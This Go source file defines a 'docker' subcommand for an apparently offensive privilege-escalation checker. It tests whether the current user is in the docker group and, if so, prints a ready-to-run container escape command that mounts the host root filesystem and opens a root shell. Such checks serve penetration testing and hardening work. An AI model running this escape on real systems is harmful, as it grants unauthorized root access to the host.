package cmd

import (
	"os/exec"
	"strings"
	"fmt"
	"github.com/fatih/color"
	"github.com/spf13/cobra"
)

var dockerCmd = &cobra.Command{
	Use:   "docker",
	Short: "Check if user is in the docker group",
	Run: func(cmd *cobra.Command, args []string) {
		output, err := exec.Command("groups").Output()
		if err != nil {
			fmt.Println("Error: %v",err)
			return
		}

		if strings.Contains(string(output), "docker") {
			color.Green("[+] User is in the docker group — potential escape!")
			fmt.Println("Try: docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
		} else {
			color.Red("[-] User is NOT in the docker group.")
		}
	},
}

func init() {
	rootCmd.AddCommand(dockerCmd)
}
